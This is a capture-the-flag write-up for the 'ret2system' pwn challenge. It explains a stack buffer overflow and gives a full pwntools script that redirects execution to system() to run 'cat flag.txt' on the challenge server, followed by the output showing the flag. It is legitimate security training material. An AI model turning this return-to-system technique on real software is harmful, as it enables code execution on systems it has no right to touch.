# Access Denied: Pwn/ret2system


## Question 

Oh... Oh. I have system here.

server: nc 34.134.85.196 9337

[ret2system](ret2system)

## Solution

The program suffers a ``buffer overflow`` that allows us to overwrite the return address with ``system``. We'll use the previous input to write ``cat flag.txt`` to the address ``0x804c060``

```python
from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x804929d
break *0x804929e
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.134.85.196',9337)
    else:
        return process(e.path)


p = start()
p.recvuntil(b'You are allowed to store some value')
p.sendline(b'cat flag.txt')
p.recvuntil(b'Enter the buffer now')

system = e.plt["system"]
usefulString = 0x804c060

payload = flat(
    b"A" * 44,
    system, # call system("/bin/cat flag.txt")
    b"B" * 4, # return address for system
    usefulString, # arg for system
)

p.sendline(payload)

p.interactive()
```

Running our script yields the flag 

```
$ python3 pwn-ret2sys.py BIN=./ret2system REMOTE
[*] '/root/workspace/access_denied/ret2system/ret2system'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loading gadgets for '/root/workspace/access_denied/ret2system/ret2system'
[+] Opening connection to 34.134.85.196 on port 9337: Done
[*] Switching to interactive mode

accessdenied{n3xt_1_w1ll_n0t_1nclud3_system_func710n_1t53lf_e8dd6fc7}
```
